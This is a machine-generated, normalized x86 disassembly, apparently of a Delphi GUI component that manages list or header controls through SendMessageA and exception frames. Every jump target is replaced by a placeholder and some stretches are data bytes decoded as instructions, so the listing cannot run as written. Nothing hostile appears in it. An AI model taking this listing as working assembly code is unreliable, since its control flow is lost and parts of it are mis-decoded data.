inc ebx
xor esi esi
pop edx
call sub_4293cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ccb1
mov eax [ esi + 0x4 ]
call sub_4171e4
push eax
mov eax [ esi + 0x4 ]
call sub_47cecc
call sub_448484
mov ecx [ ebp - 0x4 ]
inc edi
xor ebx ebx
inc esi
dec ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4171ec
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4171ec
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_47ccb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx esi
call sub_404828
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_404480
mov eax ebx
call sub_47cb88
sub_47cce0
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
pop ebx
retn
mov eax ebx
call sub_416e68
push eax
mov eax [ ebx + 0x4 ]
call sub_47cecc
call sub_448484
pop edx
call sub_4291dc
mov [ ebx + 0x24 ] eax
sub_47cd14
cmp edx [ eax + 0x24 ]
je r-xdata
retn
mov ecx [ eax + 0x18 ]
cmp edx ecx
jge r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
jle r-xdata
test edx edx
jl r-xdata
mov [ eax + 0x24 ] edx
call sub_47cb88
cmp ecx edx
jge r-xdata
mov edx ecx
jmp r-xdata
mov edx ecx
sub_47cd40
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_416e68
test eax eax
je r-xdata
mov [ esi + 0xc ] bl
xor edx edx
mov eax esi
call sub_416e44
mov eax [ esi + 0x4 ]
call sub_47cecc
mov edx [ eax ]
call [ edx + 0x80 ]
sub_47cd78
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0xd ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xd ] dl
mov eax [ ebx + 0x4 ]
call sub_47cecc
test eax eax
je r-xdata
mov eax ebx
call sub_47cb88
mov eax [ ebx + 0x4 ]
call sub_47cecc
mov si 0xffee
call sub_4038bc
sub_47cddc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416a84
pop esi
pop ebx
retn
mov dl [ esi + 0xc ]
mov eax ebx
call sub_47cd40
mov dl [ esi + 0xd ]
mov eax ebx
call sub_47cd78
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_47ccb8
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_47cdac
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_47cdbc
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_47cdcc
mov eax esi
call sub_47cce0
mov edx eax
mov eax ebx
call sub_47cd14
pop esi
pop ebx
retn
sub_47ce50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_404480
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_416e80
sub_47ce74
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_416fc0
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47ced4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_47cecc
call sub_4813ec
pop esi
pop ebx
retn
mov eax esi
call sub_416e68
push eax
mov eax ebx
call sub_47cecc
pop edx
call sub_48142c
pop esi
pop ebx
retn
sub_47cf08
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_47cecc
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_47cfe3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4171e4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4171e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_47cecc
call sub_448484
mov edx ebx
call sub_4291c4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_47cecc
call sub_4813ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc esi
xor ebx ebx
mov [ edi ] 0x3
xor eax eax
mov [ edi + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47ceb8
mov eax [ eax + 0x24 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_47cecc
call sub_448484
mov ecx edi
mov edx ebx
call sub_4291b4
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47ceb8
mov [ eax + 0x28 ] ebx
inc ebx
dec esi
jne r-xdata
sub_47cff4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_416ddc
mov [ esi + 0x20 ] 0x80000008
lea eax [ esi + 0x1c ]
call sub_40442c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47d04c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_404480
mov dl 0x1
mov eax ebx
call sub_416e44
pop esi
pop ebx
retn
sub_47d07c
inc [ eax ]
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jo r-xdata
insb
jae r-xdata
fimul [ ebx - 0x5f2b1739 ]
stc
call [ eax - 0x75 ]
inc ebp
clc
lea edi [ ecx + edx * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
inc ebx
dec esi
jne r-xdata
lea eax [ esi + 0x1c ]
call sub_40442c
mov eax esi
test bl bl
je r-xdata
rcl [ ebp - 0x75 ] 0xec
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_47d146
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xffff
call sub_4038bc
mov [ ebp - 0x8 ] eax
mov eax edi
call sub_4171e4
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405994
add esp 0x4
mov eax edi
call sub_4171e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax edi
call sub_47d154
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
push esi
push edi
lea esi [ eax + 0xc ]
call sub_448484
mov ecx [ ebp - 0x4 ]
pop edx
call sub_429404
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d14d
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405ab4
retn
mov eax edi
call sub_4171e4
push eax
mov eax [ ebp - 0x8 ]
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
inc esi
xor ebx ebx
sub_47d27c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0x30 ] esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ edi + 0x34 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47d2c8
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41828c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_47d2f8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4182e8
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_416044
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_47d418
mov eax esi
pop esi
pop ebx
retn
sub_47d320
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4182f4
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x34 ]
call sub_416044
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_47d418
mov eax esi
pop esi
pop ebx
retn
sub_47d348
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4183d0
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_416090
mov eax [ ebx + 0x30 ]
call sub_47d5fc
pop esi
pop ebx
retn
sub_47d378
push ebx
push esi
mov esi edx
mov eax [ eax + 0x30 ]
call sub_47d52c
mov ebx eax
mov eax ebx
call sub_47f7cc
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_4171e4
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_481180
cmp [ eax + 0x24 ] 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_48142c
sub_47d3bc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_418608
or ecx 0xffffffff
mov edx ebx
mov eax [ esi + 0x34 ]
call sub_41621c
lea edi [ ebx + 0x1 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx edi
mov eax esi
call sub_47d418
inc edi
dec ebx
jne r-xdata
sub_47d3fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4186e4
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_47d418
pop esi
pop ebx
retn
sub_47d418
push ebx
push esi
mov esi edx
mov ebx eax
push 0xffffffff
mov eax [ ebx + 0x30 ]
call sub_47da4c
push eax
mov eax ebx
call sub_47d36c
mov ecx esi
pop edx
call sub_429338
mov edx esi
mov eax ebx
call sub_47d378
pop esi
pop ebx
retn
sub_47d470
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_47d27c
mov [ esi + 0x8 ] eax
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47d4c0
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov [ esi + 0x28 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp esi [ eax + 0x270 ]
jne r-xdata
mov eax esi
call sub_47d52c
call sub_448788
test al al
je r-xdata
xor edx edx
mov [ eax + 0x270 ] edx
mov eax [ esi + 0x8 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
mov eax esi
call sub_47da4c
push eax
mov eax esi
call sub_47d558
pop edx
call sub_4290a4
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_47d56c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov al [ esi + 0x2a ]
pop esi
pop ebx
retn
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax esi
call sub_47da4c
push eax
mov eax ebx
call sub_448484
pop edx
call sub_4292ec
test eax eax
setne al
pop esi
pop ebx
retn
sub_47d5b0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_47d56c
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x2a ] bl
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x244 ] 0x0
jne r-xdata
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax edi
call sub_47da4c
push eax
mov eax esi
call sub_448484
mov ecx ebx
pop edx
call sub_42930c
sub_47d618
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_404828
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x24 ]
mov edx esi
call sub_404480
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov eax ebx
call sub_47d52c
call sub_47f7cc
test al al
je r-xdata
push 0xffffffff
mov eax ebx
call sub_47da4c
push eax
mov eax ebx
call sub_47d558
xor ecx ecx
pop edx
call sub_429338
mov eax ebx
call sub_47d52c
mov al [ eax + 0x229 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov eax ebx
call sub_47d52c
mov eax [ eax + 0x23c ]
call sub_4171e4
test eax eax
jle r-xdata
mov eax ebx
call sub_47d52c
call sub_480f24
mov eax ebx
call sub_47d52c
xor edx edx
call sub_481180
cmp [ eax + 0x24 ] 0xffffffff
jg r-xdata
mov eax ebx
call sub_47d52c
call sub_4813ec
sub_47d6c8
push ebx
mov ebx eax
cmp edx [ ebx + 0xc ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_47d52c
mov al [ eax + 0x229 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_47d52c
call sub_480f24
sub al 0x2
jne r-xdata
sub_47d6f8
push ebx
push esi
mov esi eax
cmp edx 0x4
ja r-xdata
xor ebx ebx
jmp [ edx * 4 + jump_table_47d708 ]
mov ebx 0x4
jmp r-xdata
mov ebx 0x8
jmp r-xdata
mov ebx 0x1
jmp r-xdata
mov ebx 0x2
jmp r-xdata
mov ebx 0x20
jmp r-xdata
mov eax esi
call sub_47da4c
push eax
mov eax esi
call sub_47d558
mov ecx ebx
pop edx
call sub_4292dc
test eax ebx
setne al
pop esi
pop ebx
retn
sub_47d760
push ebx
push esi
push edi
mov ebx eax
cmp edx 0x4
ja r-xdata
xor esi esi
jmp [ edx * 4 + jump_table_47d771 ]
xor edi edi
mov edi esi
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x20
jmp r-xdata
push esi
mov eax ebx
call sub_47da4c
push eax
mov eax ebx
call sub_47d558
mov ecx edi
pop edx
call sub_4292ac
pop edi
pop esi
pop ebx
retn
test cl cl
je r-xdata
sub_47d7d0
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi eax
xor ebx ebx
sub edx 0x1
jb r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ esi + 0x10 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x1c ]
je r-xdata
dec edx
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax esi
call sub_47da4c
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_47d558
mov edx esp
call sub_429074
jmp r-xdata
mov bl 0x1
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi [ esi + 0x20 ]
je r-xdata
jmp r-xdata
mov eax esi
call sub_47da4c
push eax
mov eax esi
call sub_47da4c
push eax
mov eax esi
call sub_47d52c
pop edx
pop ecx
call sub_47f198
push 0xf00
mov eax [ esi + 0x1c ]
inc eax
call sub_428f54
push eax
mov eax esi
call sub_47da4c
push eax
mov eax esi
call sub_47d558
pop edx
pop ecx
call sub_4292ac
jmp r-xdata
mov bl 0x1
mov [ esi + 0x20 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
cmp [ eax + 0x244 ] 0x0
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push 0xf000
lea eax [ edi + 0x1 ]
call sub_429058
push eax
mov eax esi
call sub_47da4c
push eax
mov eax esi
call sub_47d558
pop edx
pop ecx
call sub_4292ac
xor edi edi
sub_47d90c
push ebx
add esp 0xffffffd8
mov ebx eax
cmp edx [ ebx + 0x14 ]
je r-xdata
add esp 0x28
pop ebx
retn
mov [ ebx + 0x14 ] edx
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x10
mov [ esp + 0x24 ] edx
mov eax ebx
call sub_47da4c
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_47d558
mov edx esp
call sub_429074
mov eax ebx
call sub_47da4c
push eax
mov eax ebx
call sub_47da4c
push eax
mov eax ebx
call sub_47d52c
pop edx
pop ecx
call sub_47f198
sub_47d978
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416a84
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov esi eax
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_47d618
mov edx [ esi + 0xc ]
mov eax ebx
call sub_47d6c8
mov ecx [ esi + 0x10 ]
xor edx edx
mov eax ebx
call sub_47d7d0
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_47d90c
mov ecx [ esi + 0x1c ]
mov edx 0x1
mov eax ebx
call sub_47d7d0
mov ecx [ esi + 0x20 ]
mov edx 0x2
mov eax ebx
call sub_47d7d0
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_47da38
mov eax esi
call sub_47d56c
mov edx eax
mov eax ebx
call sub_47d5b0
pop esi
pop ebx
retn
sub_47da10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x24 ]
mov edx [ esi + 0x24 ]
call sub_404828
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
cmp eax [ esi + 0xc ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_47da68
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_47da4c
push eax
mov eax esi
call sub_47d558
mov ecx edi
pop edx
call sub_429104
pop edi
pop esi
pop ebx
retn
sub_47daa4
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_47d450
cmp edi eax
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov ecx edi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_47d464
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax ebx
call sub_47da4c
mov [ esp + 0x4 ] eax
inc esi
mov [ esp + 0x8 ] esi
mov eax ebx
call sub_47d558
mov edx esp
call sub_429074
sub_47db10
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47db4c
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_47dcc8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_47db84
push ebx
push esi
push edi
add esp 0xffffffd8
mov esi ecx
mov ebx eax
test edx edx
jne r-xdata
mov edi edx
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0xf4 ]
mov edi eax
jmp r-xdata
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_47e4e8
push esp
mov eax ebx
call sub_47dbf8
pop edx
call sub_42908c
mov eax edi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47dbd4
mov esi eax
test esi esi
jge r-xdata
sub_47dbd4
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_448788
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_47dbf8
call sub_429048
pop ebx
retn
sub_47dc04
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_448788
test al al
je r-xdata
mov eax esi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov [ esp ] 0x4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_47dbf8
mov edx esp
call sub_42905c
test eax eax
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x28
call sub_402fc4
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx esp
mov eax [ ebx + 0x4 ]
call sub_47fa9c
mov esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
sub_47dc84
push ebx
add esp 0xffffffe8
mov ebx eax
mov [ esp ] 0x1
mov [ esp + 0x8 ] edx
mov eax ebx
call sub_47dbf8
mov ecx esp
or edx 0xffffffff
call sub_4290f4
add esp 0x18
pop ebx
retn
sub_47dd00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
test dl dl
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x229 ]
mov [ eax + 0x288 ] dl
xor edx edx
call sub_480f54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4171e4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x288 ]
call sub_480f54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4171e4
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
call sub_47dbf8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_47f7cc
test al al
je r-xdata
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
xor eax eax
push ebp
push sub_47de81
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0xb
mov eax [ ebp - 0x4 ]
call sub_47dbf8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x0
retn
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_47f7d8
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebx + 0x20 ] eax
mov eax ebx
call sub_47cce0
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_47cb88
inc edi
dec esi
jne r-xdata
mov edx eax
mov eax ebx
call sub_47cd14
xor eax eax
mov [ ebx + 0x20 ] eax
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x264 ]
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_47ceb8
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_47ceb8
mov ebx eax
mov eax [ ebx + 0x20 ]
test eax eax
jge r-xdata
sub_47ded8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_416a84
mov eax edi
call sub_47dcc8
mov ebp ebx
mov eax ebp
call sub_47dbd4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_47dc04
push eax
mov eax edi
call sub_47db78
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_47df38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax edi
call sub_47dbd4
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_47dbd4
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_47dbd4
test eax eax
setg bl
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_47dbd4
dec eax
test eax eax
jl r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx esi
mov eax edi
call sub_47dc04
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_47dc04
pop edx
call sub_47da10
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_47dfc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_416b70
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_47e22c
push ebp
call sub_47df38
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47e01d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47e20a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47dcc8
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax ebx
call sub_418b0c
mov eax [ ebp - 0xc ]
call sub_40859c
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_47e1e8
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ecx [ ebp - 0xc ]
sub ecx 0x4
mov eax [ ebp - 0x14 ]
lea edx [ eax + 0x4 ]
mov eax ebx
call sub_418b0c
mov eax [ ebp - 0x14 ]
add eax 0x8
mov [ ebp - 0x18 ] eax
xor ebx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx eax
sub edx [ ebp - 0x14 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e1ef
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_47dbd4
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0x14 ]
